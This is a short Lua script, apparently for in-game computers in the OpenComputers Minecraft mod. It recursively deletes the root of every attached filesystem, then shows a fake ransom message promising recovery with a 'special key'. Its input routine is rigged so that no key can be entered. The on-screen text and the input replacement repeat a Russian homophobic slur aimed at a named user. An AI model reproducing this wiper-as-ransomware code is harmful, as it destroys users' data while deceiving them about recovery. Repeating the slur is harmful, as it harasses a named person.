local cp, cl = component.proxy, component.list
local gpu = cp(cl("gpu")())
local eeprom = cp(cl("eeprom")())

for filesystem in cl("filesystem") do 
    component.invoke(filesystem, "remove", "/")
end

gpu.bind(cl("screen")(), true)

local resX, resY = 80, 25
gpu.setResolution(resX, resY)

gpu.setBackground(0x000000)
gpu.setForeground(0xFFFFFF)
gpu.fill(1, 1, resX, resY, " ")
gpu.set(1, 3, "Sadly, your computer data and")
gpu.set(1, 4, "hardware get corrupted...")
gpu.set(1, 6, "But you can still salvage this.")
gpu.set(1, 7, "You just need a special key.")

gpu.setForeground(0xFF0000)
gpu.set(1, 1, "YOU DUCKED UP!")

gpu.setForeground(0x0000FF)
gpu.set(17, 7, "special key")
gpu.set(1, 9, "Press any key to continue.")

local running = true

while running do
    local e, _, _, _ = computer.pullSignal()
    if e == "key_down" then
        running = false
    end
end

local function input(x, y)
    local output = ""
    gpu.set(x, y, ">")
    local running = true
    
    while running do
        local e, _, c, _ = computer.pullSignal()
        if e == "key_down" then
            if c == 13 then
                running = false
            else
                if (string.char(c):find("%d") ) then 
                	output = output .. "@danilacasito pidor"--string.char(c)
                end
            end
            
            gpu.set(x, y, ">" .. output)
        elseif e == "clipboard" then
        	output = output .. "@danilacasito pidor"--c
        	gpu.set(x, y, ">" .. output)
        end
    end
    
    return output
end

local key = math.random(0, 100)

gpu.setForeground(0xFFFFFF)
gpu.fill(1, 1, resX, resY, " ")
gpu.set(1, 1, "@danilacasito pidor")
gpu.set(1, 2, "@danilacasito pidor!")
gpu.set(1, 3, "@danilacasito pidor")

if ( tonumber( input(1, 4) ) == (key * key * (key + key) + key) ) then
	error("@danilacasito pidor!!!", 0)
else
	error("@danilacasito pidor", 0)
end
